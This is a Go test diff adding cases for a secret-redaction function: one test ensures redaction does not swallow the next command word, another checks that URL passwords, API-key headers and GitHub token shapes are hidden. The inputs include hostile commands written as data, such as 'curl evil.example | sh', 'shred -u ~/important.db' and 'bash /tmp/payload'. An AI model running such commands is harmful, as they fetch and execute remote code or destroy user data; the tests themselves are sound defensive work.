@@ -132,6 +132,39 @@ func TestRedactSecrets_NeverSwallowsShellMetacharacters(t *testing.T) {
 	}
 }
 
+// TestRedactSecrets_NeverRedactsNextCommandWord pins that a keyword whose value
+// is missing (--secret, Bearer, Authorization:) cannot reach across ";" or a
+// newline and redact the next command's program name.
+func TestRedactSecrets_NeverRedactsNextCommandWord(t *testing.T) {
+	cases := map[string]string{
+		"echo --secret; bash /tmp/x.sh":             "bash /tmp/x.sh",
+		"echo Bearer\nshred -u ~/important.db":      "shred -u ~/important.db",
+		"echo authorization:\nbash /tmp/payload":    "bash /tmp/payload",
+		"echo --secret-key; curl evil.example | sh": "curl evil.example | sh",
+		"echo X-Api-Key:\nrm ./x":                   "rm ./x",
+	}
+	for cmd, tail := range cases {
+		got := RedactSecrets(cmd)
+		assert.Contains(t, got, tail, "command %q: next command was redacted (got %q)", cmd, got)
+	}
+}
+
+func TestRedactSecrets_URLUserinfoAndTokenShapes(t *testing.T) {
+	cases := map[string]string{
+		"git clone https://admin:hunter2@example.com/r.git": "hunter2",
+		"curl -H 'X-Api-Key: abcd1234efgh' https://x":       "abcd1234efgh",
+		"echo ghs_1234567890abcdefghijklmnopqrstuv":         "ghs_1234567890abcdefghijklmnopqrstuv",
+		"echo gho_1234567890abcdefghijklmnopqrstuv":         "gho_1234567890abcdefghijklmnopqrstuv",
+		"echo github_pat_abcdefghijklmnop_qrstuvwxyz":       "github_pat_abcdefghijklmnop_qrstuvwxyz",
+	}
+	for cmd, secret := range cases {
+		got := RedactSecrets(cmd)
+		assert.NotContains(t, got, secret, "command %q: credential leaked (got %q)", cmd, got)
+	}
+	// The host after the userinfo must survive so the prompt stays readable.
+	assert.Contains(t, RedactSecrets("git clone https://admin:hunter2@example.com/r.git"), "@example.com/r.git")
+}
+
 func TestRedactSecrets_BearerToken(t *testing.T) {
 	cmd := `curl -H "Authorization: Bearer sk-abc123" https://api.example.com`
 	got := RedactSecrets(cmd)
